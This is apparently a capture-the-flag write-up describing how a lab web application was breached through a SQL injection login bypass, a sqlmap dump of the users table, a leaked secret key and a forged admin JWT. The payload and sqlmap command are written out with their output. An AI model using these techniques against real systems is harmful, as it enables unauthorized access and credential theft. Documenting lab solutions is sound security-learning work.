# This_WEB_Too_Simple Write-up

## Summary

This write-up outlines the steps taken to exploit a web application to gain unauthorized admin access. The process involved discovering a `robots.txt` file, exploiting a SQL injection vulnerability on the login page, extracting database schema and credentials, extracting a secret key through an API endpoint, and forging an admin JWT token to access the admin page.

## Steps

### 1. Discovery of `robots.txt`

The `robots.txt` file was found at the root of the web server. It contained the following entries:

```
User-agent: *
Disallow: /
Disallow: /login
Disallow: /admin
Allow: /api*
```

The disallowance of the `/login` and `/admin` paths indicated restricted areas, while the allowance of `/api*` paths suggested a potential point of interaction.

### 2. SQL Injection and Login

An SQL injection vulnerability was identified on the login page (`login.html`). There are two ways to exploit this vulnerability:

#### Manual SQL Injection

By manually entering a SQL injection payload into the `username` and `password` fields, authentication can be bypassed:

```
malicious_user' OR '1'='1
```

This payload allows logging in with a non-admin user token.

#### Automated SQL Injection with sqlmap

Alternatively, the SQL injection vulnerability can be exploited using sqlmap, an automated tool that detects and exploits SQL injection flaws. The following sqlmap command can be used to dump the contents of the `users` table:

```bash
sqlmap -r request.txt --ignore-code=401 -p username -D SQLite_masterdb -T users --dump
```

This command instructs sqlmap to ignore any HTTP 401 unauthorized error codes, target the `username` POST parameter, select the SQLite_masterdb database, list the contents of the `users` table, and dump the data.

After executing the sqlmap command, the structure of the database was retrieved, revealing a table named `users` with columns for `id`, `username`, and `password`. The SQL command used to create the `users` table is:

```
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password TEXT NOT NULL
)
```

Furthermore, an entry within the `users` table was extracted, indicating the presence of user credentials:

```
Database: <current>
Table: users
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | user123  | user     |
+----+----------+----------+
```

### 3. Token and Secret Key

With the non-admin token acquired after SQL injection, the `/api/key` endpoint was accessed. This endpoint returned a secret key that is unique and changes with each application start. For this session, the retrieved key was:

```
AeApKT1qJob7hrqgBtyjslTTCqDprHIO
```

Using this key, a JWT token was decoded and forged for admin access.

### 4. Forging the Admin Token

The JWT token's signature was verified and altered on [jwt.io](https://jwt.io) to change the user role from non-admin to admin.

### 5. Accessing the Admin Page

With the forged admin token, access was gained to the `/admin` page, where the flag was successfully retrieved.